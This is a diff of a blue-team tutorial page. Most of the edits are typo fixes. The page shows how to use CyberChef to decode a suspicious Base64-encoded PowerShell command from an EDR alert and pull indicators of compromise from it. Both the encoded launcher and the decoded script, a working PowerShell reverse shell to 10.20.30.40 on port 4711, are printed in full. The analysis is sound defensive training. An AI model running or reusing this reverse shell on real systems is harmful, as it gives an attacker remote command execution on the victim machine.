@@ -3,8 +3,7 @@ layout: defense
 title: CyberChef Introduction       
 ---
 
-CyberChef  can be used to: Encode, Decode, Format data, Parse data, Encrypt,  Decrypt, Compress data, Extract data, perform arithmetic functions  against data, defang data, and many other functions. 
-
+CyberChef  can be used to: Encode, Decode, Format data, Parse data, Encrypt,  Decrypt, Compress data, Extract data, perform arithmetic functions  against data, defang data, and many other functions
 
 ## Short intro into the UI
 
@@ -21,7 +20,7 @@ Based on the picture from above, all sections can be described as:
 
 2. **Recipe** – Instructions for telling CyberChef what to do with the data. A Recipe usually consists of multiple Operations
 
-3. **Input Section** – The provided data that you’re manipulating. 
+3. **Input Section** – The provided data that you’re manipulating.
 
 4. **Output section** – The result of the Input based on the applied Recipe functions.
 
@@ -32,7 +31,7 @@ Based on the picture from above, all sections can be described as:
 
 As a blue teamer you receive an alert from your EDR tool, that detected the execution of a suspicious PowerShell script. To gather some IOCs, it's always a good idea to analyze the script.
 
-By reveiwing the alert, you see the following command from the PowerShell logs:
+By reviewing the alert, you see the following command from the PowerShell logs:
 
 ```bash
 powershell.exe -NoP -sta -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMgAwAC4AMwAwAC4ANAAwACIALAA0ADcAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
@@ -63,7 +62,7 @@ In order to decode the command, we’ll need to tell CyberChef to decode the Bas
 <img width="600" src="/images/cyberchef_b64.png">
 </p>
 
-The Output looks now a little better, but is still not human-readable. We can recognize fragments of words, which is heavly scambles by red "nul" fragments resp. null bytes. 
+The Output looks now a little better, but is still not human-readable. We can recognize fragments of words, which is heavly scrambles by red "nul" fragments resp. null bytes. 
 
 Copy the text now from the Output section and paste it into the Input section again.
 
@@ -81,7 +80,7 @@ Finally we got a result that is human readable:
 $client = New-Object System.Net.Sockets.TCPClient("10.20.30.40",4711);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-To come back to our inital questions related to IOCs we can now dig deeper and summarize the following results:
+To come back to our initial questions related to IOCs we can now dig deeper and summarize the following results:
 
 1. The PowerShell drops a reverse Shell, so this script can be seen as malicious.
 2. The target URL 10.20.30.40 on Port 4711 belongs to our adversary.
